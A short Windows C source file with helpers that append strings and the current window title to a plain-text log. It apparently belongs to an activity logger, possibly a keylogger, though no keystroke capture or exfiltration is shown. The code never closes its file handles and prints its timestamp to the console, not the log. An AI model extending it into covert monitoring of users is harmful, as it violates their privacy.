#include "header.h"

bool	put_file(char *str)
{
	FILE *fichier;

	fichier = fopen("text.txt", "a+");
	if (!fichier)
		return (0);
	fputs(str, fichier);
	return (1);
}

bool	put_window_file(HWND window)
{
	FILE *fichier;
	SYSTEMTIME time;
	WCHAR window_name[120];


	fichier = fopen("text.txt", "a+");
	if (!fichier)
		return (0);
	GetSystemTime(&time);
	printf("\n\n# [ %d / %d / %d ]\n# %d:%d\n", time.wDay, time.wMonth, time.wYear,
		time.wHour, time.wMinute);
	GetWindowText(window, window_name, 120);
	fwprintf(fichier, L"-------- %s -------\n", window_name);

	return (1);
}